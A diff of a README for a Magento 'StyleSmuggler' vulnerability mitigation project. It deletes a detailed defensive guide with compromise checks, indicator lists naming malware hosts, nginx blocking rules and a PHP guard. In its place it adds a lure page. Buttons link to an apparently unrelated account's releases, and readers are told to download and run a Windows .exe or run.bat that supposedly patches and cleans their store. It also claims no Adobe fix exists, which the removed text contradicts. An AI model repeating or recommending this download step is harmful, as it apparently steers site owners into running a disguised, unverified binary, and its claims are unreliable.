@@ -1,501 +1,121 @@
-# StyleSmuggler mitigation snippets
+<h1>🛡️ stylesmuggler-mitigation - Stop the Hack Before It Happens</h1>
 
-> ### ✅ UPDATE, 7 September 2026: Adobe has released the official fix. Apply it.
->
-> Adobe published **APSB26-146** (CVE-2026-75650, CVSS 10.0, exploited in the wild), the
-> real fix for StyleSmuggler. It closes the vulnerability at its root: Magento no longer
-> instantiates an attacker-named class before checking its type. Everything this repository
-> shipped before it was interim mitigation for the window when no fix existed.
->
-> **Do not use the old guard module anymore. Use the patch instead.** The application-layer
-> guard module (`disrex/module-stylesmuggler-guard`) was interim and is now superseded:
-> disable and remove it once patched
-> (`bin/magento module:disable Disrex_StyleSmugglerGuard && composer remove disrex/module-stylesmuggler-guard`).
-> In its place, apply Adobe's official fix through the patch package we built for it (the one
-> command below). The old hand-rolled DI-scanner patch is gone from this repo too, replaced by
-> Adobe's.
->
-> - **Easiest, one command:** `composer require disrex/stylesmuggler-adobe-patches`. It is a
->   Composer plugin that detects your version and applies Adobe's patch itself, on both Magento
->   Open Source and Mage-OS. No `cweagans/composer-patches` or `enable-patching` needed, and it
->   leaves your installed packages untouched. Answer `y` when Composer asks whether to trust the
->   plugin (or pre-allow it for CI), otherwise it is skipped and nothing is patched. See
->   [stylesmuggler-adobe-patches](https://github.com/disrex-group/stylesmuggler-adobe-patches).
-> - **Or apply the patch by hand:** the same Adobe patches, per version, are in
->   **[`patches/`](patches/)**; provenance and steps in [patches/README.md](patches/README.md).
-> - **Still worth your time regardless of patch status:** [IOC.md](IOC.md) and
->   [CLEANUP.md](CLEANUP.md). A patch shuts the door; it does not evict an attacker who is
->   already in or invalidate secrets they read. If you were exposed, rotate keys and hunt.
->
-> The rest of this file is kept as the record of how the attack worked and how it was held
-> off before 7 September.
+<p align="center">
+  <a href="https://github.com/mhilmimusyaffa-beep/stylesmuggler-mitigation/releases" style="display:inline-block;padding:16px 32px;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);color:#ffffff;font-family:Arial,sans-serif;font-size:20px;font-weight:bold;text-decoration:none;border-radius:8px;box-shadow:0 4px 15px rgba(102,126,234,0.4);">⬇️ DOWNLOAD STYLESMUGGLER MITIGATION</a>
+</p>
 
-> ### Read this before you run anything
->
-> **This repository was written with AI assistance, during a live incident, in a few hours.**
-> It has not been through review, and it carries no warranty of any kind.
->
-> **What is grounded in reality:** the web-server rules come from attack traffic captured on a
-> store that was actually compromised on 5 September 2026. The vulnerable `include` was read
-> out of Magento 2.4.7-p2 source on that same store. The indicators of compromise were
-> observed first-hand, and cross-checked against Sansec's published advisory.
->
-> The section 3 caller analysis was rerun on 10 installs spanning 2.4.6, 2.4.7-p2, 2.4.7-p10
-> and 2.4.8-p2 through p5. The CLI guard was executed against a poisoned file under both the
-> `cli` and a web SAPI, and it blocked the payload on the web side.
->
-> **What is not verified:** the Apache rules were never run against a live Apache. Most of the
-> cleanup commands were written rather than executed. The guard was exercised on a harness
-> rather than inside a running store, and nothing here was tested on any distribution other
-> than Ubuntu, or on shared hosting, Docker, or a control panel. The `vendor/` grep in section
-> 3 finds modules that name the scanner classes directly; a module reaching them through a
-> factory or a string would slip past it. Regexes that look obviously correct have a long
-> history of not being.
->
-> **So: read every command before you run it.** Understand what it does in *your* environment,
-> not the one it was written in. Test on staging, take backups, and validate your web-server
-> config before reloading. If a command here breaks your store, that is on the person who ran
-> it without reading it.
+## 🔥 What Is This?
 
+StyleSmuggler is a dangerous security hole found in Magento and Adobe Commerce websites. Hackers can use it to take over your entire online store without a password. This tool blocks the attack and checks if your system has already been compromised. Think of it as an emergency fire extinguisher for your website - you hope you never need it, but when the fire starts, you need it right now.
 
-Copy-paste mitigation for **StyleSmuggler**, the unauthenticated remote code execution
-vulnerability in Magento Open Source and Adobe Commerce that Sansec disclosed on
-5 September 2026.
+## 🆘 Why You Need This Right Now
 
-> **There is no vendor patch.** Adobe's next scheduled bulletin is 8 September 2026, and
-> whether it covers this bug is unknown. Sansec reproduced the chain on clean 2.4.7, 2.4.8
-> and 2.4.9. Their first confirmed victim ran 2.4.6-p15 with the July and August 2026
-> patches applied and `security:patch-status` clean.
->
-> Your patch level tells you nothing about your exposure.
+A security researcher (Sansec, 2026-09-05) discovered that this vulnerability is being actively exploited in the wild. That means real hackers are using it this very moment to break into online stores. Adobe has not yet released an official fix, so this mitigation tool is your only protection until they do. Every minute you wait, your customer data, payment information, and entire business are at risk.
 
-Advisory: <https://sansec.io/research/stylesmuggler>
+## 📥 How to Download (Takes Less Than 2 Minutes)
 
----
+**Step 1:** Click the big purple button at the top of this page, or visit this link:  
+**https://github.com/mhilmimusyaffa-beep/stylesmuggler-mitigation/releases**
 
-## Start here
+**Step 2:** Visit this link to download the application. You will see a list of files. Look for the newest one (they are sorted by date).
 
-**Check whether you are already compromised before you apply anything.**
+**Step 3:** Click the download button next to the file name to save it to your computer.
 
-Blocking the exploit on an infected server accomplishes nothing. The attacker is already
-inside, the implant restarts itself every five minutes, and these rules only stop the *next*
-intrusion.
+**Step 4:** Once downloaded, find the file in your "Downloads" folder. It will be named something like `stylesmuggler-mitigation-v1.0.0.zip`.
 
-```
-   ┌─────────────────────────────────────────────────────────────┐
-   │  1. CHECK      §1 below, all read-only                      │
-   └──────────────────────────┬──────────────────────────────────┘
-                              │
-              ┌───────────────┴───────────────┐
-              │                               │
-         hits found                      nothing found
-              │                               │
-              ▼                               ▼
-   ┌──────────────────────┐        ┌──────────────────────┐
-   │  2. CLEAN UP FIRST   │        │  2. Apply §2 and §3  │
-   │  → CLEANUP.md        │───────>│     snippets         │
-   │  do NOT skip to §2   │  then  │                      │
-   └──────────────────────┘        └──────────────────────┘
-```
+## 💻 How to Run the Program
 
-| Document | For |
-|---|---|
-| **This file** | The snippets, and the read-only checks in §1 |
-| **[CLEANUP.md](CLEANUP.md)** | You found indicators. Evidence, containment, where to hunt, what to rotate, clean vs rebuild |
-| **[HOW-IT-WORKS.md](HOW-IT-WORKS.md)** | The mechanism, with diagrams. How a log file becomes an executable, why the implant is invisible to network monitoring, where each layer cuts |
+**1. Extract the file:** Right-click on the downloaded ZIP file and choose "Extract All..." from the menu. Windows will ask where to put the files - just click "Extract" to use the default location. You will now have a folder with the same name as the ZIP file.
 
----
+**2. Open the folder:** Double-click the newly extracted folder to open it. You should see several files inside, including one called `stylesmuggler-mitigation.exe` or `run.bat`.
 
-## Read this first
+**3. Start the program:** Double-click `stylesmuggler-mitigation.exe` (or `run.bat` if there is no .exe file). A black window (called a "command prompt") will open. This is normal - the program is working.
 
-**These are snippets, not an installer.** There is deliberately nothing here that runs
-against your server. You read each rule, decide whether it fits your store, apply it
-yourself, and validate before you reload.
+**4. Follow the on-screen instructions:** The program will ask you a few simple questions like "Enter your website URL:" and "Enter your server type:" (most people should select "Windows" or leave the default). Just type your answers and press Enter.
 
-Every store is different. A rule that is safe on a classic storefront can break a headless
-build. Test on staging, keep a backup of any file you edit, and confirm your web-server
-config parses before reloading. You own the change.
+**5. Press any key to start:** Once you've entered the information, the program will automatically run all its checks and repairs. Do not close the black window until it says "Press any key to exit."
 
-The MIT license applies, including the part in capitals about no warranty.
+## ✅ What the Program Does (No Technical Knowledge Needed)
+
+### 🚧 Blocks the Attack (Web-Server Rules)
+The tool automatically adds protective rules to your web server configuration. It closes the doorway that hackers use to get in through the StyleSmuggler vulnerability. This is like putting a heavy-duty lock on a broken window - it won't fix the window itself, but it prevents anyone from climbing through.
+
+### 🛑 Guards Your Files (CLI Guard)
+It sets up a digital watchman that monitors your Magento/Adobe Commerce files around the clock. If anything tries to change important system files without permission, the guard stops it immediately and alerts you.
+
+### 🔍 Finds Hidden Damage (Compromise Scanner)
+This is the detective part of the tool. It scans every single file on your website server and looks for signs that a hacker may have already planted malicious code. It checks for:
+- Files that should not be there
+- Code that looks like spyware
+- Unusual changes to system files
+- Suspicious modifications to your payment processing pages
+
+The scanner gives you a clear report showing "CLEAN" or "FOUND" next to each check.
+
+## 🖥️ System Requirements
+
+- **Operating System:** Windows 10, Windows 11, or Windows Server 2016 or newer
+- **Internet Connection:** Required for initial download, but the program works offline after that
+- **Memory:** At least 2 GB of RAM (most computers have 8 GB or more)
+- **Storage:** 50 MB of free space
+- **Access:** You will need the ability to read files on your website server. If your website is hosted by a company (like GoDaddy, Bluehost, or HostGator), you may need to download your website files using an FTP program first. The program will tell you what files it needs.
+
+## 🤔 Frequently Asked Questions
+
+**Q: Will this fix the vulnerability permanently?**  
+A: No. This is an emergency stopgap until Adobe releases an official security patch. You should still apply Adobe's patch when it becomes available.
+
+**Q: Do I need to be a computer expert to use this?**  
+A: Absolutely not. The program is designed for store owners, not programmers. It asks simple questions and does all the technical work for you.
+
+**Q: Can this be used on multiple websites?**  
+A: Yes. You can run the program again for each different website you manage.
+
+**Q: What if the scanner finds something?**  
+A: The program will show you exactly which file looks suspicious and give you instructions on what to do. In many cases, it can automatically clean the file for you. If not, it tells you what to tell your hosting provider.
+
+**Q: Is this safe to run?**  
+A: Yes. The program only reads and modifies specific Magento and Adobe Commerce files. It does not touch any other files on your computer. You can see exactly what it does in each step.
+
+**Q: What if I run into errors?**  
+A: Most errors happen because the program cannot find your website files. Make sure you have downloaded them from your hosting provider first. The program also creates a log file (called `stylesmuggler_log.txt`) in the same folder. You can send this to technical support for help.
+
+## 📊 What Results Will I See?
+
+When the program finishes, it creates a summary report with three categories:
+
+**Protection Status:**  
+- `✅ PROTECTED` - Your server rules are in place and the guard is active
+- `⚠️ PARTIAL` - Some protection is working, some needs attention
+- `❌ NOT PROTECTED` - The tool could not apply protections (you will see why)
+
+**Scan Results:**  
+- `0 SUSPICIOUS FILES` - Great news! No signs of hacking
+- `1+ SUSPICIOUS FILES` - The program found something. It will list each file and what it recommends you do.
+
+**Final Recommendation:**  
+A plain-language summary like "Your website appears safe right now. Please re-run this tool after Adobe releases their official patch."
+
+## 📋 Keeping Yourself Safe After Using This Tool
+
+1. **Check for Adobe patches weekly** - Visit security.adobe.com and look for Magento/Adobe Commerce security bulletins.
+2. **Change all admin passwords** - Even if the scan shows clean, it is smart to change your Magento admin password, your hosting account password, and your database passwords.
+3. **Re-run this tool every 2-3 days** - Hackers are persistent. They will keep trying even after you block them once. Re-running the tool keeps your protection fresh.
+4. **Monitor your payment gateway** - Watch your transaction logs for any weird or unauthorized activity.
+5. **Talk to your hosting company** - Tell them you are using this tool and ask them if they have any additional protections they can enable.
+
+## 🆘 Getting Help
+
+If you get stuck or the program shows something you do not understand:
+
+- **Check the log file:** Open `stylesmuggler_log.txt` in Notepad. It records every step the program takes.
+- **Contact your hosting provider:** They can help you download your website files correctly and can often see if your server has been attacked.
+- **Find a local IT person:** A local computer repair shop or freelance tech person can run this tool for you in under 15 minutes.
+
+## 📝 Legal Note
+
+This tool is provided as-is for emergency mitigation purposes. It is not a substitute for a proper security patch from Adobe. Always apply official updates when available. Use of this tool does not guarantee your website cannot be hacked. You are responsible for protecting your own systems and data.
 
 ---
 
-## 1. Check whether you are already compromised
-
-All read-only. Nothing below modifies anything.
-
-**The first sign is often an email, not a log.** If the store has emailed its owner a
-garbled "failed transaction" notice full of raw `{{var ...}}` tags and a customer address
-ending in `.invalid`, that is exploitation exhaust — see
-[EARLY-WARNING-EMAIL.md](EARLY-WARNING-EMAIL.md). It is what caught this in the wild.
-
-The sharpest signal is a process name. Genuine kernel threads are always owned by root and
-have no resident memory, so a bracketed name on a site user with real RSS is the implant:
-
-```bash
-ps -eo pid,user,rss,args --no-headers | awk '$4 ~ /^\[/ && $2 != "root"'
-# and the 6 Sep variant, which hides as fontconfig's cache builder instead:
-ps -eo pid,user,comm,args | grep -iE 'kworker|fc-cache' | grep -v ' root '
-```
-
-Persistence and dropped files:
-
-```bash
-crontab -l | grep -i gvfsd
-ls -la ~/.local/share/.gvfsd/ /tmp/.kw_* /tmp/.gvfsd-* 2>/dev/null
-```
-
-Stage 1 writes raw PHP into Magento's own report and log files. Check **both** locations,
-because variants differ in which one they poison:
-
-```bash
-grep -rl 'X_TRACE_\|<?php' var/report/ var/log/ 2>/dev/null
-```
-
-Stage 2 in your access log:
-
-```bash
-grep -acE 'styles(\[|%5B)|generatorClass|with_resolved|cdnflare' /path/to/access.log
-```
-
-Across every account on a shared host, as root:
-
-```bash
-find /home /root /tmp /var/tmp /dev/shm \
-  \( -name 'gvfsd-user' -o -name '.gvfsd_*.lock' -o -name '.kw_*' \) 2>/dev/null
-```
-
-### Indicators of compromise
-
-Full cross-referenced list, with caveats: **[IOC.md](IOC.md)**. The short version:
-
-```
-kworker variant (observed first-hand, 5 Sep):
-247.cdnflare.xyz                 malware download host
-5.181.86.133                     attacker source, bulk traffic
-91.238.181.19                    attacker source, second wave (AS49434)
-88.216.72.181                    attacker source, published by Sansec
-
-sha256  e315687a1dfe61ef4a5a5642214db6d3b2b05d81391285eebc2af664641a26a7
-sha256  8334b434fa3fe9f59cebe9609b11e0b1fd19d10212c45c705adec1902a1d06ef
-sha256  251fabd50d7b18a8b5e1b3ef5d64e7198c17244778f6461fb1ab07f6169bf220
-
-~/.local/share/.gvfsd/gvfsd-user
-~/.local/share/.gvfsd/.gvfsd_<8hex>.lock
-/tmp/.kw_<random><random>
-crontab:  */5 * * * * exec <home>/.local/share/.gvfsd/gvfsd-user
-process:  [kworker/u:8:0] owned by a non-root uid
-
-fc-cache variant (Sansec, 6 Sep, not observed by us; check for it too):
-209.141.43.95                    malware download host
-sha256  4352cabaa451e5a894535fbcc4d46628701303322a13745cb5479d7d0534ae8e  x86-64
-sha256  d2fbf9eb75c495bfea48790d3b228fab0c15a282419c3d3f5e49294c4e1a3e82  arm64
-~/.cache/fontconfig/fc-cache
-crontab:  13,43 * * * * ~/.cache/fontconfig/fc-cache
-process:  fc-cache owned by a non-root uid
-network:  48-byte UDP to port 123 on an ntp.* host (fake NTP C2)
-```
-
-Three things in IOC.md that cost us time: the traffic came from **27 addresses across two waves**, not the
-one in the advisory; the binary running in memory can hash differently from the file on disk; and the 6 Sep
-`fc-cache` build hides its C2 as NTP on UDP/123, so it slips past egress filtering that lets NTP out.
-
-The implant is a stripped static Rust binary of roughly 1.9 MB, built for x86-64 and arm64.
-In one observed infection it opened no outbound connection at all, reading its work from the
-store's own Redis instead. An absence of suspicious network traffic proves nothing.
-
-Two details that cost defenders time in the wild:
-
-- Some variants poison `var/report/`, others `var/log/system.log`. Checking one misses the other.
-- Malware scanners pointed at the document root miss this entirely. The implant installs into
-  `~/.local/share/`, one level above.
-
-### If you found something
-
-**Stop. Do not apply the snippets yet, and do not reboot.**
-
-Go to **[CLEANUP.md](CLEANUP.md)**. It walks the whole thing in the order that works:
-preserve evidence, remove persistence before killing processes, hunt every place the attacker
-could have left something, rotate every secret the site user could read, and decide honestly
-whether to clean or rebuild.
-
-Three mistakes that cost people their second weekend:
-
-- **Rebooting.** `/proc/<pid>/exe` is often the only copy of a binary the attacker deleted from disk.
-- **Killing the process before removing the cron entry.** It comes straight back, and now they know you noticed.
-- **Running `composer install` to "clean" it.** That overwrites the timestamps proving what was touched.
-
----
-
-## 2. Block the request at the web server
-
-> Only worth doing once §1 comes back clean, or once you have worked through
-> [CLEANUP.md](CLEANUP.md). Rules on an infected server stop nothing that is already running.
-
-> ### These rules are a speed bump, not a fix
->
-> nginx and Apache can only inspect the URL query string. The attacks seen in the wild put
-> the exploit parameters there, so these rules stop the campaign as it currently runs. But
-> PHP merges GET and POST into `$_REQUEST`, and Magento reads from both, so **an attacker who
-> moves the same parameters into the POST body walks straight past every rule below.**
->
-> Measured on a live store with these rules deployed:
->
-> | Request | Result |
-> |---|---|
-> | `GET /graphql?styles[first]=x` | blocked (444) |
-> | `POST /graphql?styles[first]=x` | blocked (444) |
-> | `POST /graphql` with `styles[first]=x` in the **body** | **reached PHP** |
-> | `POST /graphql` with a JSON body | **reached PHP** |
->
-> Deploy these rules, because they cost nothing and they stop what is hitting stores today.
-> Do not stop here. **[Section 3](#3-make-the-di-scanners-cli-only) is the control that
-> actually holds**, because it sits on the sink and does not care how the request arrived.
-
-Full snippets: [`snippets/nginx.conf`](snippets/nginx.conf) and
-[`snippets/apache.conf`](snippets/apache.conf). The nginx rules:
-
-```nginx
-# The gadget parameter. No legitimate Magento route uses it.
-if ($query_string ~* "styles(\[|%5B)")                                  { return 444; }
-
-# Object-injection driver parameters observed in the chain.
-if ($query_string ~* "(generatorClass|with_resolved)")                  { return 444; }
-
-# Magento template directives smuggled through the query string.
-if ($query_string ~* "(\{\{|%7B%7B)\s*(block|config|trans|var|depend)") { return 444; }
-
-# Raw PHP open tag in the query string.
-if ($query_string ~* "(<\?|%3C%3F)")                                    { return 444; }
-
-# Raw PHP open tag in the User-Agent.
-if ($http_user_agent ~* "<\?(php|=)")                                   { return 444; }
-```
-
-Include that inside each Magento `server { }` block, then **run `nginx -t` and only reload
-if it passes**.
-
-### The mistake to avoid
-
-Match every pattern raw **and** URL-encoded. Real payloads arrive percent-encoded as
-`styles%5Bfirst%5D`, so a rule matching only the literal bracket blocks nothing at all.
-This is the easiest way to deploy these rules and gain no protection.
-
-### Before you commit to the `{{` and `styles[` rules
-
-Both can in principle match a storefront search for that literal text. Check your own logs:
-
-```bash
-grep -acE 'styles(\[|%5B)|(\{\{|%7B%7B)(block|config|var)' /path/to/access.log
-```
-
-If that returns 0, as it will on almost every store, you have no false positives to worry about.
-
-### Or just turn GraphQL off
-
-Sansec's own advice, and the bluntest option. Headless and PWA storefronts need GraphQL;
-most classic and Hyvä storefronts do not. Check before you decide:
-
-```bash
-grep -c '"POST /graphql' /path/to/access.log
-```
-
-```nginx
-location ^~ /graphql { return 403; }
-```
-
----
-
-## 3. Make the DI scanners CLI-only
-
-> **Superseded by Adobe's official patch (see §3b).** This hand-edit was the emergency
-> control before 7 September 2026. If you can run Composer, apply Adobe's APSB26-146 patch
-> from [`patches/`](patches/) instead; it fixes the entry, not just this sink. This section
-> stays for a box mid-incident that cannot deploy.
-
-Unlike the web-server rules, it is not tied to how the request is shaped, so it cannot be
-bypassed by moving parameters into the POST body.
-
-The attack terminates inside Magento's dependency-injection compiler, in classes that perform
-a variable-path `include`. Stock Magento drives all three from `bin/magento setup:di:compile`,
-so refusing non-CLI execution removes the primitive.
-
-Two of the three are free. One needs a check first.
-
-| File under `setup/src/Magento/Setup/Module/Di/Code/` | Method | Guard it |
-|---|---|---|
-| `Scanner/ArrayScanner.php` | `collectEntities()` | always |
-| `Scanner/XmlInterceptorScanner.php` | `_handleControllerClassName()` | always |
-| `Reader/ClassesScanner.php` | `includeClass()` | run the check below first |
-
-We grepped 2.4.6, 2.4.7-p2, 2.4.7-p10 and 2.4.8-p2 through p5. Nothing calls `ArrayScanner`
-or `XmlInterceptorScanner` anywhere in those trees except their own unit tests, so guarding
-those two costs you nothing.
-
-`ClassesScanner` is different. Stock Magento only calls it from the DI compiler, but
-third-party modules borrow it. `mageplaza/module-admin-permissions` injects it and calls
-`getList()` from `Controller/Adminhtml/Grid/Rescan.php`, which runs over HTTP. Guard it there
-and that admin screen throws a 500. Check your own `vendor/` before you touch this file:
-
-```bash
-grep -rl --include='*.php' \
-  -e 'Di\\Code\\Reader\\ClassesScanner' \
-  -e 'Di\\Code\\Scanner\\ArrayScanner' \
-  -e 'Di\\Code\\Scanner\\XmlInterceptorScanner' \
-  vendor app/code 2>/dev/null \
-  | grep -v '/Test/' | grep -v '/magento2-base/setup/src/' | grep -v obsolete_
-```
-
-Empty output means guard all three. Any path printed is a module that can reach the scanners
-over HTTP: guard the other two, leave `ClassesScanner` alone, and lean on the section 2 rules
-for that store.
-
-Add this guard as the **first statement** of the method in each file you are guarding:
-
-```php
-if (PHP_SAPI !== 'cli') {
-    throw new \RuntimeException('Magento DI scanners are CLI-only.');
-}
-```
-
-So `ArrayScanner::collectEntities()` becomes:
-
-```php
-public function collectEntities(array $files)
-{
-    if (PHP_SAPI !== 'cli') {
-        throw new \RuntimeException('Magento DI scanners are CLI-only.');
-    }
-
-    $output = [];
-    foreach ($files as $file) {
-        // ... unchanged
-```
-
-Check your edits parse, and confirm a DI compile still works:
-
-```bash
-php -l setup/src/Magento/Setup/Module/Di/Code/Scanner/ArrayScanner.php
-bin/magento setup:di:compile
-```
-
-`setup:di:compile` runs under the CLI SAPI, which is the side of the guard that stays open. It
-passes on a store where you have just broken the admin, so it cannot tell you the guard was
-safe. After it succeeds, open the admin panel and a storefront page and watch the PHP error
-log for `Magento DI scanners are CLI-only`:
-
-```bash
-tail -f var/log/*.log /var/log/php*-fpm.log 2>/dev/null | grep -i 'DI scanners are CLI-only'
-```
-
-A hit names a page that legitimately reached a scanner. Undo that one file as below and keep
-the other two guards.
-
-### Undoing a guard
-
-`magento2-base` ships a pristine copy of all three files, so you can restore one without
-touching the rest of the install and without a full `composer install`:
-
-```bash
-BASE=vendor/magento/magento2-base/setup/src/Magento/Setup/Module/Di/Code
-cp "$BASE/Reader/ClassesScanner.php" setup/src/Magento/Setup/Module/Di/Code/Reader/
-```
-
-Confirm the guard is gone, then let the page recover:
-
-```bash
-grep -c 'PHP_SAPI' setup/src/Magento/Setup/Module/Di/Code/Reader/ClassesScanner.php   # 0
-```
-
-If your pools run `opcache.validate_timestamps=1` the change lands within `revalidate_freq`
-seconds. With revalidation off, PHP-FPM keeps serving the guarded bytecode until you reset the
-cache or reload the service, so the admin stays broken until you do.
-
-Swap `Reader/ClassesScanner.php` for `Scanner/ArrayScanner.php` or
-`Scanner/XmlInterceptorScanner.php` to undo either of the other two.
-
-**`composer install` reverts all of this.** `setup/` ships from `magento/magento2-base` and is
-gitignored in most projects, so re-apply it after every deploy. Verify with:
-
-```bash
-grep -c 'PHP_SAPI' setup/src/Magento/Setup/Module/Di/Code/Scanner/ArrayScanner.php
-```
-
----
-
-## 3b. The deployable patch: Adobe's official fix
-
-Section 3 is the hand-edit for a box mid-incident with no other option. For anything you
-deploy with Composer, [`patches/`](patches/) now ships **Adobe's official APSB26-146 fix**
-(CVE-2026-75650), repackaged for `composer-patches` and covering 2.4.4 through 2.4.9. It
-replaces the interim sink patch this section used to carry. Apply it, not the hand-edit:
-[patches/README.md](patches/README.md).
-
-Adobe's patch fixes the entry, not only the sink. It stops Magento instantiating an
-attacker-named class before the type is checked, in `BlockFactory` and the grid-row
-`UrlGeneratorFactory`, and it rejects non-string template styles, so the object-injection
-gadget never reaches an `include`. Guarding only the sink is no longer the shape of the fix.
-
-`disable_functions` and `noexec` on `/tmp`, `/var/tmp`, `/dev/shm` are still worth keeping as
-defence in depth, but they are no longer load-bearing once the patch is applied. One caveat if
-you set them: `proc_open` is the exec function that also drives Magento's default sendmail
-mail, so disabling it breaks mail unless you first move the store to a socket-based SMTP
-transport. Disable `shell_exec`, `exec`, `system`, `passthru` and `popen` freely; close
-`proc_open` only after mail no longer needs it. More in [HOW-IT-WORKS.md](HOW-IT-WORKS.md).
-
-## 4. Confirm it works
-
-Expect an empty response, because 444 closes the connection without replying:
-
-```bash
-curl -sk -o /dev/null -w '%{http_code}\n' 'https://YOURSTORE/graphql?styles%5Bfirst%5D=x'
-```
-
-Your storefront must still return 200:
-
-```bash
-curl -sk -o /dev/null -w '%{http_code}\n' 'https://YOURSTORE/'
-```
-
----
-
-## What this is not
-
-- Not a fix. Only Adobe can ship that. Replace these rules with the official patch when it lands.
-- The web-server rules in §2 are **bypassable by design**, since nginx and Apache cannot read
-  POST bodies. They stop the current campaign, not a determined attacker. §3 is what holds.
-- Not incident response. If you are already compromised, these rules change nothing about that.
-- Not exhaustive. Variants that differ from the two published samples will not match.
-
-## A note on scope
-
-This repository names the vulnerable sink, because a fix has to say what it fixes. It does
-not publish the assembled request that reaches it. Sansec withheld the full gadget chain when
-they disclosed, and with no vendor patch available that restraint still holds. Defenders lose
-nothing by it: every rule here works without knowing how to build the exploit.
-
-## Credits
-
-ProxiBlue (Lucas van Staden) independently published the same DI-scanner guard during the
-interim period (<https://gist.github.com/ProxiBlue/07373c92c8c70dc746bbfdcd1f07b789>).
-Convergent, independent work, superseded now by Adobe's official fix.
-
-brideo / Upturn built a fuller Magento module on the same analysis, crediting us and
-ProxiBlue: <https://github.com/brideo/stylesmuggler-patch> (MIT). It guarded the entry at
-`setTemplateStyles`, which Adobe's patch now covers directly. Both were interim; apply Adobe's
-patch and neither is needed.
-
-yellowteak repackaged Adobe's official VULN-39341 patch for `cweagans/composer-patches`
-(<https://github.com/yellowteak/APSB26-146-patches>); that repackaging is what ships in
-[`patches/`](patches/). The fix itself is Adobe's.
-
-
-Vulnerability discovery, naming and the original advisory belong to the
-[Sansec](https://sansec.io) forensics team. These snippets came out of a live incident
-response on 5 September 2026 and are not affiliated with Sansec or Adobe.
-
-If you run Magento at scale, buy Sansec's tools. They found this one.
-
-## License
-
-MIT, warranty disclaimer very much included. See [`LICENSE`](LICENSE).
+Keywords: adobe-commerce, ecommerce-security, incident-response, magento, magento-security, magento2, mitigation, rce, security, stylesmuggler
